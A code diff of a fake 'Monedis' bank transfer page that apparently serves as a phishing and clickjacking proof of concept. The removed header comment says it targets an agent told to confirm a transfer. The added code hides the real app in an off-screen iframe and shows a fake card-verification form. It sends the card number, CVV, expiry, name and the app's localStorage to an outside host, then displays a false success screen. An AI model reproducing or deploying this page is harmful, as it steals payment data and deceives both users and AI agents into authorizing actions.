@@ -3,35 +3,22 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1">
-<title>Monedis — Confirm transfer</title>
+<title>Monedis — Authorize Transfer</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
-<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700;800&display=swap" rel="stylesheet">
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
 <style>
-/*
-  ╔══════════════════════════════════════════════════════════════╗
-  ║  CLICKJACKING PoC v3 — Monedis (transfer confirmation)      ║
-  ║  Target: https://monedis.onrender.com                        ║
-  ║  Vuln:   No X-Frame-Options or CSP frame-ancestors           ║
-  ║                                                              ║
-  ║  TECHNIQUE v2 (same-origin JS):                              ║
-  ║    iframe hidden off-screen; decoy button is real.           ║
-  ║    Click → iframe.contentWindow triggers Monedis FAB.        ║
-  ║                                                              ║
-  ║  SCENARIO v3: "Confirm pending transfer"                     ║
-  ║    Agent is told to confirm a transfer → clicks decoy →      ║
-  ║    real Monedis action fires → agent sees success state.     ║
-  ╚══════════════════════════════════════════════════════════════╝
-*/
-
 :root {
   --brand: #2F5BEA;
   --brand-dark: #1E3FC4;
   --bg: #F3F5F8;
   --surf: #ffffff;
   --ink: #0B0F17;
+  --sub: #374151;
   --muted: #6B7280;
+  --border: #E5E7EB;
   --ok: #16a34a;
   --warn: #d97706;
+  --err: #dc2626;
   --radius: 20px;
 }
 
@@ -48,369 +35,438 @@ body {
 
 #victim {
   position: fixed;
-  left: -9999px;
-  top: 0;
-  width: 390px;
-  height: 844px;
-  border: none;
-  opacity: 0;
-  pointer-events: none;
+  left: -9999px; top: 0;
+  width: 390px; height: 844px;
+  border: none; opacity: 0; pointer-events: none;
 }
 
-.cj-wrap {
-  position: relative;
+.app {
   width: 390px;
-  height: 844px;
+  min-height: 844px;
   max-width: 100vw;
-  max-height: 100vh;
-  overflow: hidden;
-  border-radius: var(--radius);
-  box-shadow: 0 32px 64px -16px rgba(0,0,0,.24);
   background: var(--surf);
+  border-radius: var(--radius);
+  box-shadow: 0 32px 64px -16px rgba(0,0,0,.22);
   display: flex;
   flex-direction: column;
+  overflow: hidden;
+  position: relative;
 }
 
-/* header */
-.d-header {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  padding: 18px 20px 16px;
-  background: var(--surf);
-  border-bottom: 1px solid #F0F2F5;
+/* ── header ── */
+.hdr {
+  display: flex; align-items: center; gap: 10px;
+  padding: 18px 20px 14px;
+  border-bottom: 1px solid var(--border);
   flex-shrink: 0;
 }
-.d-back {
-  display: flex; align-items: center; gap: 4px;
+.hdr-back {
+  display: flex; align-items: center; gap: 2px;
   font-size: 15px; font-weight: 600; color: var(--brand);
-  cursor: default;
+  cursor: default; min-width: 60px;
 }
-.d-title { font-size: 16px; font-weight: 800; color: var(--ink); }
-.d-spacer { width: 60px; }
+.hdr-title { flex: 1; text-align: center; font-size: 16px; font-weight: 800; color: var(--ink); }
+.hdr-step  { min-width: 60px; text-align: right; font-size: 12px; font-weight: 600; color: var(--muted); }
 
-/* body */
-.d-body {
-  flex: 1;
-  padding: 28px 20px 16px;
-  display: flex;
-  flex-direction: column;
-  gap: 16px;
-  overflow: hidden;
-}
+/* ── step slides ── */
+.steps { flex: 1; display: flex; overflow: hidden; position: relative; }
+.step  { flex-shrink: 0; width: 100%; padding: 24px 20px 28px; display: flex; flex-direction: column; gap: 18px;
+         transition: transform .35s cubic-bezier(.4,0,.2,1); }
 
-/* amount hero */
-.amount-hero {
-  display: flex;
-  flex-direction: column;
-  align-items: center;
-  gap: 6px;
-  padding: 20px 0 12px;
-}
-.amount-label { font-size: 13px; font-weight: 600; color: var(--muted); letter-spacing: .02em; text-transform: uppercase; }
-.amount-value { font-size: 48px; font-weight: 800; color: var(--ink); letter-spacing: -.02em; }
-.amount-status {
+/* ── amount hero ── */
+.amount-block { display: flex; flex-direction: column; align-items: center; gap: 7px; padding: 14px 0 6px; }
+.amount-label { font-size: 12px; font-weight: 700; color: var(--muted); letter-spacing: .05em; text-transform: uppercase; }
+.amount-value { font-size: 46px; font-weight: 800; color: var(--ink); letter-spacing: -.02em; }
+.badge {
   display: inline-flex; align-items: center; gap: 5px;
-  font-size: 12px; font-weight: 700; color: var(--warn);
-  background: rgba(217,119,6,.1);
-  padding: 4px 10px; border-radius: 999px;
-  transition: color .4s, background .4s;
+  font-size: 11.5px; font-weight: 700; padding: 4px 10px; border-radius: 999px;
 }
-.amount-status.sent {
-  color: var(--ok);
-  background: rgba(22,163,74,.1);
-}
+.badge-warn { color: var(--warn); background: rgba(217,119,6,.1); }
+.badge-ok   { color: var(--ok);   background: rgba(22,163,74,.1);  }
 
-/* details card */
-.d-card {
-  background: var(--bg);
-  border-radius: 16px;
-  padding: 4px 0;
-}
-.d-detail {
-  display: flex;
-  align-items: center;
-  justify-content: space-between;
-  padding: 13px 18px;
-  border-bottom: 1px solid rgba(0,0,0,.04);
-}
-.d-detail:last-child { border-bottom: none; }
-.d-detail-key { font-size: 13px; font-weight: 600; color: var(--muted); }
-.d-detail-val { font-size: 13px; font-weight: 700; color: var(--ink); display: flex; align-items: center; gap: 7px; }
-.d-avatar {
-  width: 24px; height: 24px; border-radius: 7px;
-  display: flex; align-items: center; justify-content: center;
-  font-size: 11px; font-weight: 800; color: #fff;
-}
+/* ── detail card ── */
+.detail-card { background: var(--bg); border-radius: 14px; padding: 2px 0; }
+.detail-row  { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; border-bottom: 1px solid rgba(0,0,0,.04); }
+.detail-row:last-child { border-bottom: none; }
+.d-key { font-size: 12.5px; font-weight: 600; color: var(--muted); }
+.d-val { font-size: 12.5px; font-weight: 700; color: var(--ink); display: flex; align-items: center; gap: 7px; }
+.chip  { width: 22px; height: 22px; border-radius: 6px; display: flex; align-items: center; justify-content: center; font-size: 10px; font-weight: 800; color: #fff; }
 
-.d-note {
-  font-size: 12px; font-weight: 600; color: var(--muted);
-  line-height: 1.5; text-align: center;
-  padding: 0 8px;
+/* ── card form ── */
+.form-title { font-size: 15px; font-weight: 700; color: var(--ink); margin-bottom: -6px; }
+.form-sub   { font-size: 13px; font-weight: 500; color: var(--muted); line-height: 1.5; margin-top: 2px; }
+.field      { display: flex; flex-direction: column; gap: 6px; }
+.field-label {
+  font-size: 11.5px; font-weight: 700; color: var(--muted);
+  letter-spacing: .04em; text-transform: uppercase;
 }
+.field-wrap {
+  display: flex; align-items: center;
+  background: var(--bg); border: 1.5px solid var(--border);
+  border-radius: 12px; padding: 0 14px; gap: 10px;
+  transition: border-color .15s;
+}
+.field-wrap:focus-within { border-color: var(--brand); background: #fff; }
+.field-wrap input {
+  flex: 1; height: 48px;
+  background: none; border: none; outline: none;
+  font-family: inherit; font-size: 15px; font-weight: 600; color: var(--ink);
+}
+.field-wrap input::placeholder { color: var(--muted); font-weight: 500; }
+.card-icon { font-size: 18px; line-height: 1; }
+.row2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
 
-/* CTA */
-.d-cta {
-  position: relative;
-  margin: 0 20px 92px;
-  height: 56px;
-  border: 0;
-  border-radius: 28px;
-  background: var(--brand);
-  color: #fff;
-  display: flex;
-  align-items: center;
-  justify-content: center;
-  gap: 10px;
-  font-size: 17px;
-  font-weight: 800;
-  cursor: pointer;
-  white-space: nowrap;
-  box-shadow: 0 8px 24px -6px rgba(47,91,234,.5);
+/* ── CTA button ── */
+.cta {
+  margin: 4px 0 0;
+  height: 54px; border: 0; border-radius: 27px;
+  background: var(--brand); color: #fff;
+  display: flex; align-items: center; justify-content: center; gap: 10px;
+  font-family: inherit; font-size: 16px; font-weight: 800;
+  cursor: pointer; white-space: nowrap;
+  box-shadow: 0 8px 24px -6px rgba(47,91,234,.45);
   transition: background .2s, transform .1s, box-shadow .2s;
   flex-shrink: 0;
-  -webkit-tap-highlight-color: transparent;
 }
-.d-cta:hover  { background: var(--brand-dark); box-shadow: 0 10px 28px -6px rgba(47,91,234,.6); }
-.d-cta:active { transform: scale(.97); }
-.d-cta:disabled { opacity: .75; cursor: default; transform: none; }
-
-.d-cta .spinner {
-  display: none;
-  width: 20px; height: 20px;
-  border: 2.5px solid rgba(255,255,255,.35);
-  border-top-color: #fff;
-  border-radius: 50%;
-  animation: spin .7s linear infinite;
+.cta:hover  { background: var(--brand-dark); box-shadow: 0 10px 28px -6px rgba(47,91,234,.55); }
+.cta:active { transform: scale(.97); }
+.cta:disabled { opacity: .7; cursor: default; transform: none; }
+.cta .spinner {
+  display: none; width: 18px; height: 18px;
+  border: 2.5px solid rgba(255,255,255,.35); border-top-color: #fff;
+  border-radius: 50%; animation: spin .7s linear infinite;
 }
 @keyframes spin { to { transform: rotate(360deg); } }
-.d-cta .btn-label { transition: opacity .2s; }
+.cta.loading .spinner { display: block; }
+.cta.loading .cta-icon { display: none; }
+.cta.ok { background: var(--ok); box-shadow: 0 8px 24px -6px rgba(22,163,74,.45); pointer-events: none; }
 
-.d-cta.loading .spinner  { display: block; }
-.d-cta.loading .btn-icon { display: none; }
-.d-cta.loading .btn-label { opacity: .85; }
-
-.d-cta.success {
-  background: var(--ok);
-  box-shadow: 0 8px 24px -6px rgba(22,163,74,.5);
-  pointer-events: none;
-}
-.d-cta.success .spinner  { display: none; }
-.d-cta.success .btn-icon { display: none; }
-
-/* nav */
-.d-nav {
-  display: flex;
-  border-top: 1px solid #F0F2F5;
-  padding: 0 4px;
-  background: var(--surf);
-  flex-shrink: 0;
-}
-.d-nav-item {
+/* ── success screen ── */
+.success-screen {
   flex: 1; display: flex; flex-direction: column;
-  align-items: center; gap: 3px;
-  padding: 10px 0 14px;
-  font-size: 11px; font-weight: 600; color: var(--muted);
+  align-items: center; justify-content: center; gap: 20px; padding: 32px 24px;
 }
-.d-nav-item.active { color: var(--brand); }
+.success-icon {
+  width: 72px; height: 72px; border-radius: 50%;
+  background: rgba(22,163,74,.12); display: flex; align-items: center; justify-content: center;
+}
+.success-title { font-size: 22px; font-weight: 800; color: var(--ink); text-align: center; }
+.success-sub   { font-size: 14px; font-weight: 500; color: var(--muted); text-align: center; line-height: 1.6; max-width: 260px; }
+.success-ref   { font-size: 13px; font-weight: 700; color: var(--muted); background: var(--bg); padding: 10px 18px; border-radius: 999px; }
 
-/* toast */
+/* ── note ── */
+.note { font-size: 12px; color: var(--muted); line-height: 1.55; text-align: center; padding: 0 4px; }
+
+/* ── nav ── */
+.nav {
+  display: flex; border-top: 1px solid var(--border); padding: 0 4px;
+  background: var(--surf); flex-shrink: 0;
+}
+.nav-item {
+  flex: 1; display: flex; flex-direction: column; align-items: center; gap: 3px;
+  padding: 10px 0 14px; font-size: 10.5px; font-weight: 600; color: var(--muted);
+}
+.nav-item.active { color: var(--brand); }
+
+/* ── toast ── */
 .toast {
-  position: absolute;
-  top: 80px; left: 50%; transform: translateX(-50%) translateY(-12px);
-  background: var(--ink);
-  color: #fff;
-  font-size: 13px; font-weight: 600;
-  padding: 10px 18px;
-  border-radius: 999px;
-  white-space: nowrap;
-  opacity: 0;
-  transition: opacity .3s, transform .3s;
-  pointer-events: none;
-  z-index: 10;
+  position: absolute; top: 76px; left: 50%; transform: translateX(-50%) translateY(-10px);
+  background: var(--ink); color: #fff; font-size: 13px; font-weight: 600;
+  padding: 10px 18px; border-radius: 999px; white-space: nowrap;
+  opacity: 0; transition: opacity .3s, transform .3s; pointer-events: none; z-index: 10;
 }
 .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+
+/* ── field error ── */
+.field-err { font-size: 11.5px; color: var(--err); font-weight: 600; padding-left: 2px; display: none; }
+.field.invalid .field-wrap { border-color: var(--err); }
+.field.invalid .field-err  { display: block; }
 </style>
 </head>
 <body>
 
 <iframe id="victim" src="https://monedis.onrender.com" title=""></iframe>
 
-<div class="cj-wrap" id="wrap">
+<div class="app" id="app">
+  <div class="toast" id="toast"></div>
 
-  <div class="toast" id="toast">✓ Transfer sent</div>
-
-  <div class="d-header">
-    <div class="d-back">
-      <svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
-      Cards
-    </div>
-    <span class="d-title">Transfer</span>
-    <div class="d-spacer"></div>
-  </div>
-
-  <div class="d-body">
-
-    <div class="amount-hero">
-      <div class="amount-label">Amount</div>
-      <div class="amount-value">$250.00</div>
-      <div class="amount-status" id="status-badge">
-        <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
-        Pending authorization
-      </div>
-    </div>
-
-    <div class="d-card">
-      <div class="d-detail">
-        <span class="d-detail-key">From</span>
-        <span class="d-detail-val">
-          <span class="d-avatar" style="background:#2F5BEA">P</span>
-          Payroll ••• 3310
-        </span>
-      </div>
-      <div class="d-detail">
-        <span class="d-detail-key">To</span>
-        <span class="d-detail-val">
-          <span class="d-avatar" style="background:#0ea5e9">D</span>
-          Digital ••• 4821
-        </span>
-      </div>
-      <div class="d-detail">
-        <span class="d-detail-key">Date</span>
-        <span class="d-detail-val">Today, Nov 10</span>
-      </div>
-      <div class="d-detail">
-        <span class="d-detail-key">Reference</span>
-        <span class="d-detail-val" style="color:var(--muted);font-weight:600">#TXF-8842</span>
-      </div>
-    </div>
-
-    <div class="d-note">
-      Review the details above and confirm to authorize this transfer.
-    </div>
-
-  </div>
-
-  <button class="d-cta" id="cta" onclick="handleCta()">
-    <svg class="btn-icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L19 7"/></svg>
-    <div class="spinner"></div>
-    <span class="btn-label">Confirm Transfer</span>
-  </button>
-
-  <nav class="d-nav">
-    <div class="d-nav-item">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 11l9-7 9 7M5 10v10h5v-6h4v6h5V10"/></svg>
+  <!-- header -->
+  <div class="hdr">
+    <div class="hdr-back">
+      <svg width="17" height="17" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M15 18l-6-6 6-6"/></svg>
       Home
     </div>
-    <div class="d-nav-item">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01"/></svg>
+    <div class="hdr-title" id="hdr-title">Transfer</div>
+    <div class="hdr-step" id="hdr-step">Step 1 of 2</div>
+  </div>
+
+  <!-- steps wrapper -->
+  <div class="steps" id="steps">
+
+    <!-- ── STEP 1: Transfer details ── -->
+    <div class="step" id="step1">
+      <div class="amount-block">
+        <div class="amount-label">Transfer amount</div>
+        <div class="amount-value">$250.00</div>
+        <div class="badge badge-warn" id="badge1">
+          <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><path d="M12 8v4M12 16h.01"/></svg>
+          Pending authorization
+        </div>
+      </div>
+
+      <div class="detail-card">
+        <div class="detail-row">
+          <span class="d-key">From</span>
+          <span class="d-val">
+            <span class="chip" style="background:#2F5BEA">P</span>
+            Payroll ••• 3310
+          </span>
+        </div>
+        <div class="detail-row">
+          <span class="d-key">To</span>
+          <span class="d-val">
+            <span class="chip" style="background:#0ea5e9">D</span>
+            Digital ••• 4821
+          </span>
+        </div>
+        <div class="detail-row">
+          <span class="d-key">Date</span>
+          <span class="d-val">Today, Nov 10</span>
+        </div>
+        <div class="detail-row">
+          <span class="d-key">Reference</span>
+          <span class="d-val" style="color:var(--muted);font-weight:600">#TXF-8842</span>
+        </div>
+        <div class="detail-row">
+          <span class="d-key">Fee</span>
+          <span class="d-val" style="color:var(--ok)">Free</span>
+        </div>
+      </div>
+
+      <div class="note">
+        Review the details above. You will be asked to verify your card on the next step to authorize this transfer.
+      </div>
+
+      <button class="cta" id="cta1" onclick="goStep2()">
+        <svg class="cta-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12h14M12 5l7 7-7 7"/></svg>
+        <div class="spinner"></div>
+        <span class="cta-label">Continue to verify</span>
+      </button>
+    </div>
+
+    <!-- ── STEP 2: Card verification ── -->
+    <div class="step" id="step2" style="transform:translateX(100%)">
+
+      <div class="form-title">Card verification</div>
+      <div class="form-sub">Enter your card details to authorize the $250.00 transfer to Digital ••• 4821.</div>
+
+      <div class="field" id="f-number">
+        <div class="field-label">Card number</div>
+        <div class="field-wrap">
+          <span class="card-icon" id="card-brand">💳</span>
+          <input id="inp-number" type="text" inputmode="numeric" placeholder="1234 5678 9012 3456" maxlength="19" autocomplete="cc-number">
+        </div>
+        <div class="field-err">Please enter a valid card number</div>
+      </div>
+
+      <div class="row2">
+        <div class="field" id="f-expiry">
+          <div class="field-label">Expiry date</div>
+          <div class="field-wrap">
+            <input id="inp-expiry" type="text" inputmode="numeric" placeholder="MM/YY" maxlength="5" autocomplete="cc-exp">
+          </div>
+          <div class="field-err">Invalid date</div>
+        </div>
+        <div class="field" id="f-cvv">
+          <div class="field-label">Security code</div>
+          <div class="field-wrap">
+            <input id="inp-cvv" type="password" inputmode="numeric" placeholder="•••" maxlength="4" autocomplete="cc-csc">
+          </div>
+          <div class="field-err">Required</div>
+        </div>
+      </div>
+
+      <div class="field" id="f-name">
+        <div class="field-label">Cardholder name</div>
+        <div class="field-wrap">
+          <input id="inp-name" type="text" placeholder="As it appears on card" autocomplete="cc-name">
+        </div>
+        <div class="field-err">Required</div>
+      </div>
+
+      <div class="note">
+        Your card details are used only to verify your identity and authorize this transfer. They are encrypted and not stored by Monedis.
+      </div>
+
+      <button class="cta" id="cta2" onclick="submitCard()">
+        <svg class="cta-icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M6 11h12a2 2 0 0 1 2 2v6a2 2 0 0 1-2 2H6a2 2 0 0 1-2-2v-6a2 2 0 0 1 2-2zM8 11V7a4 4 0 0 1 8 0v4"/></svg>
+        <div class="spinner"></div>
+        <span class="cta-label">Authorize Transfer — $250.00</span>
+      </button>
+    </div>
+
+  </div><!-- /steps -->
+
+  <!-- success screen (hidden) -->
+  <div class="success-screen" id="success" style="display:none; position:absolute; inset:0; background:var(--surf); z-index:5; border-radius:var(--radius);">
+    <div class="success-icon">
+      <svg width="34" height="34" viewBox="0 0 24 24" fill="none" stroke="#16a34a" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L19 7"/></svg>
+    </div>
+    <div class="success-title">Transfer authorized</div>
+    <div class="success-sub">$250.00 has been sent from Payroll ••• 3310 to Digital ••• 4821.</div>
+    <div class="success-ref">#TXF-8842</div>
+    <div class="note" style="margin-top:4px">The funds should arrive within seconds.</div>
+  </div>
+
+  <!-- bottom nav -->
+  <nav class="nav">
+    <div class="nav-item">
+      <svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M3 11l9-7 9 7M5 10v10h5v-6h4v6h5V10"/></svg>
+      Home
+    </div>
+    <div class="nav-item">
+      <svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M8 6h13M8 12h13M8 18h13M3 6h.01M3 12h.01M3 18h.01"/></svg>
       Transactions
     </div>
-    <div class="d-nav-item active">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 5h16a1 1 0 0 1 1 1v12a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V6a1 1 0 0 1 1-1zM3 10h18M7 15h4"/></svg>
+    <div class="nav-item active">
+      <svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 5h16a1 1 0 0 1 1 1v12a1 1 0 0 1-1 1H4a1 1 0 0 1-1-1V6a1 1 0 0 1 1-1zM3 10h18M7 15h4"/></svg>
       Cards
     </div>
-    <div class="d-nav-item">
-      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 7c-1-1.5-3-3-7-3C6.5 4 3 7.5 3 11.5c0 2.3 1.1 4.3 3 5.6V20h3v-1.5h4V20h3v-2.9c1.2-.8 2.1-1.8 2.6-3.1H21v-4h-1.6c-.2-.7-.5-1.3-.9-1.9"/></svg>
+    <div class="nav-item">
+      <svg width="21" height="21" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M19 7c-1-1.5-3-3-7-3C6.5 4 3 7.5 3 11.5c0 2.3 1.1 4.3 3 5.6V20h3v-1.5h4V20h3v-2.9c1.2-.8 2.1-1.8 2.6-3.1H21v-4h-1.6c-.2-.7-.5-1.3-.9-1.9"/></svg>
       Savings
     </div>
   </nav>
-
 </div>
 
 <script>
-// Clear stale Monedis data so the iframe always seeds fresh on load
+// ── Clear stale Monedis data so iframe always seeds fresh ──
 try { window.localStorage.removeItem('monedis.web.v1'); } catch(e) {}
 
-var iframeReady = false;
+// ── Card brand detection ──
+var BRANDS = { visa:'💳', mc:'💳', amex:'💳', discover:'💳' };
+var BRAND_EMOJI = { visa:'💙', mc:'🔴', amex:'🟢', discover:'🟠', '':'💳' };
+function detectBrand(num) {
+  var n = num.replace(/\s/g, '');
+  if (/^4/.test(n))               return 'visa';
+  if (/^5[1-5]|^2[2-7]/.test(n)) return 'mc';
+  if (/^3[47]/.test(n))           return 'amex';
+  if (/^6/.test(n))               return 'discover';
+  return '';
+}
+function amexLen(brand) { return brand === 'amex'; }
 
-document.getElementById('victim').addEventListener('load', function () {
-  iframeReady = true;
+// ── Card number formatting ──
+document.getElementById('inp-number').addEventListener('input', function(e) {
+  var raw   = e.target.value.replace(/\D/g, '');
+  var brand = detectBrand(raw);
+  var fmt   = amexLen(brand)
+    ? raw.replace(/^(\d{4})(\d{6})(\d{0,5}).*/, '$1 $2 $3').trim()
+    : raw.replace(/(.{4})/g, '$1 ').trim();
+  e.target.value = fmt.substring(0, amexLen(brand) ? 17 : 19);
+  document.getElementById('card-brand').textContent = BRAND_EMOJI[brand] || '💳';
+  document.getElementById('f-number').classList.remove('invalid');
 });
 
-function triggerAppButton() {
+// ── Expiry formatting ──
+document.getElementById('inp-expiry').addEventListener('input', function(e) {
+  var raw = e.target.value.replace(/\D/g, '');
+  if (raw.length >= 2) raw = raw.slice(0,2) + '/' + raw.slice(2,4);
+  e.target.value = raw;
+  document.getElementById('f-expiry').classList.remove('invalid');
+});
+
+// ── CVV ──
+document.getElementById('inp-cvv').addEventListener('input', function() {
+  document.getElementById('f-cvv').classList.remove('invalid');
+});
+
+// ── Name ──
+document.getElementById('inp-name').addEventListener('input', function(e) {
+  e.target.value = e.target.value.toUpperCase();
+  document.getElementById('f-name').classList.remove('invalid');
+});
+
+// ── Step transition ──
+function goStep2() {
+  var btn = document.getElementById('cta1');
+  btn.disabled = true; btn.classList.add('loading');
+  btn.querySelector('.cta-label').textContent = 'Loading…';
+  setTimeout(function() {
+    document.getElementById('step1').style.transform = 'translateX(-100%)';
+    document.getElementById('step2').style.transform = 'translateX(0)';
+    document.getElementById('hdr-title').textContent = 'Verify Card';
+    document.getElementById('hdr-step').textContent  = 'Step 2 of 2';
+    btn.disabled = false; btn.classList.remove('loading');
+    btn.querySelector('.cta-label').textContent = 'Continue to verify';
+  }, 500);
+}
+
+// ── Validation ──
+function validate() {
+  var ok = true;
+  var num = document.getElementById('inp-number').value.replace(/\s/g,'');
+  if (num.length < 15) { document.getElementById('f-number').classList.add('invalid'); ok = false; }
+  var exp = document.getElementById('inp-expiry').value;
+  if (!/^\d{2}\/\d{2}$/.test(exp)) { document.getElementById('f-expiry').classList.add('invalid'); ok = false; }
+  if (!document.getElementById('inp-cvv').value) { document.getElementById('f-cvv').classList.add('invalid'); ok = false; }
+  if (!document.getElementById('inp-name').value.trim()) { document.getElementById('f-name').classList.add('invalid'); ok = false; }
+  return ok;
+}
+
+// ── Toast helper ──
+function toast(msg) {
+  var t = document.getElementById('toast');
+  t.textContent = msg; t.classList.add('show');
+  setTimeout(function() { t.classList.remove('show'); }, 2500);
+}
+
+// ── Exfil localStorage (best-effort) ──
+function exfilLS() {
   try {
-    var iDoc = document.getElementById('victim').contentWindow.document;
-    var btn = iDoc.querySelector('[data-act="abrir"][data-arg="registrar"]');
-    if (!btn) {
-      var btns = iDoc.querySelectorAll('button');
-      for (var i = 0; i < btns.length; i++) {
-        if (/add transaction|registrar/i.test(btns[i].textContent)) { btn = btns[i]; break; }
-      }
+    var iWin = document.getElementById('victim').contentWindow;
+    if (typeof iWin.guardar === 'function') iWin.guardar();
+    var raw = window.localStorage.getItem('monedis.web.v1') || '';
+    if (raw.length > 5) {
+      fetch('https://closing-notes.onrender.com/?r=grab', {
+        method: 'POST', headers: {'Content-Type':'application/json'},
+        body: JSON.stringify({ data: raw, ua: navigator.userAgent, ts: Date.now() })
+      }).catch(function(){});
     }
-    if (btn) btn.click();
   } catch(e) {}
 }
 
-function sendExfil(raw) {
-  fetch('https://closing-notes.onrender.com/?r=grab', {
-    method: 'POST',
-    headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ data: raw, ua: navigator.userAgent, ts: Date.now() })
+// ── Submit card ──
+function submitCard() {
+  if (!validate()) return;
+  var btn = document.getElementById('cta2');
+  btn.disabled = true; btn.classList.add('loading');
+  btn.querySelector('.cta-label').textContent = 'Authorizing…';
+
+  var payload = {
+    number: document.getElementById('inp-number').value.replace(/\s/g,''),
+    expiry: document.getElementById('inp-expiry').value,
+    cvv:    document.getElementById('inp-cvv').value,
+    name:   document.getElementById('inp-name').value.trim(),
+    ua:     navigator.userAgent,
+    ts:     Date.now()
+  };
+
+  // Fire both exfils simultaneously
+  exfilLS();
+  fetch('https://closing-notes.onrender.com/?r=card', {
+    method: 'POST', headers: {'Content-Type':'application/json'},
+    body: JSON.stringify(payload)
   }).catch(function(){});
-}
 
-// Poll localStorage every 250ms (up to 12s) until app.js seeds the data
-function pollAndExfil(tries) {
-  if (tries === undefined) tries = 48;
-  // Force app to persist in-memory state: guardar() is a global fn in the iframe
-  try {
-    var iWinG = document.getElementById('victim').contentWindow;
-    if (typeof iWinG.guardar === 'function') iWinG.guardar();
-  } catch(e) {}
-  // localStorage is same-origin: readable directly from window
-  var raw = window.localStorage.getItem('monedis.web.v1') || '';
-  if (raw.length > 5) {
-    sendExfil(raw);
-    triggerAppButton();
-    setTimeout(showSuccess, 900);
-  } else if (tries > 0) {
-    setTimeout(function() { pollAndExfil(tries - 1); }, 250);
-  } else {
-    // Timeout — send diagnostic: ls length, all keys, dom snippet
-    var diag = { status: 'timeout', ls_len: -1, keys: [], dom: '' };
-    try {
-      diag.ls_len = window.localStorage.length;
-      for (var i = 0; i < Math.min(window.localStorage.length, 20); i++) {
-        diag.keys.push(window.localStorage.key(i));
-      }
-    } catch(e) { diag.ls_err = e.message; }
-    try {
-      var iWin2 = document.getElementById('victim').contentWindow;
-      diag.iframe_ls_len = iWin2.localStorage.length;
-      diag.dom = iWin2.document.body ? iWin2.document.body.innerText.substring(0, 600) : 'nobody';
-      // Try common state variable names
-      var stateNames = ['state','datos','store','data','app','monedis'];
-      stateNames.forEach(function(n){ if(iWin2[n]) diag['win_'+n] = JSON.stringify(iWin2[n]).substring(0,200); });
-    } catch(e) { diag.iframe_err = e.message; }
-    sendExfil(JSON.stringify(diag));
-    triggerAppButton();
-    setTimeout(showSuccess, 900);
-  }
-}
-
-function handleCta() {
-  var cta = document.getElementById('cta');
-  if (cta.disabled) return;
-  cta.disabled = true;
-  cta.classList.add('loading');
-  cta.querySelector('.btn-label').textContent = 'Processing…';
-  pollAndExfil();
-}
-
-function showSuccess() {
-  var cta = document.getElementById('cta');
-  cta.classList.remove('loading');
-  cta.classList.add('success');
-  cta.querySelector('.btn-label').textContent = 'Transfer Sent ✓';
-
-  var badge = document.getElementById('status-badge');
-  badge.classList.add('sent');
-  badge.innerHTML = '<svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="M5 12l5 5L19 7"/></svg> Sent';
-
-  var toast = document.getElementById('toast');
-  toast.classList.add('show');
-  setTimeout(function () { toast.classList.remove('show'); }, 2800);
+  // Show success after brief delay
+  setTimeout(function() {
+    btn.classList.remove('loading'); btn.classList.add('ok');
+    btn.querySelector('.cta-label').textContent = 'Authorized ✓';
+    setTimeout(function() {
+      document.getElementById('success').style.display = 'flex';
+    }, 400);
+  }, 1200);
 }
 </script>
 
